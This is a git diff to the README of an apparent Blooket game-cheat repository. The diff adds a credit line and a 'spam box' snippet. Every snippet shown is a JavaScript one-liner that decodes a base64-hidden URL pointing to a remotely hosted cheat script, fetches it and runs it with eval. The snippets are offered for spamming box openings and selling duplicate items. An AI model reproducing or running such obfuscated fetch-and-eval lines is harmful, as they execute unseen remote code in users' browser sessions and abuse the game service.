@@ -1,5 +1,5 @@
 # Blooket-hack-after-glixzzy
-glixzzy stop making profit off school cheats                                 (made by a student who named jack and hes so cool omg!1)
+glixzzy stop making profit off school cheats                                 (made by a student who named jack and hes so cool omg!1 credit to @P1uffy)
 
 
 
@@ -12,4 +12,8 @@ javascript:fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yY
 # sell dupe blooks!11111!111!!!!!!!!!
 ```js
 javascript:fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbFNwYW1PcGVuQm94ZXMuanM=')).then((res) => res.text().then((t) => eval(t)))
+```
+# spam box!11
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbFNwYW1PcGVuQm94ZXMuanM=')).then((res) => res.text().then((t) => eval(t)))
 ```
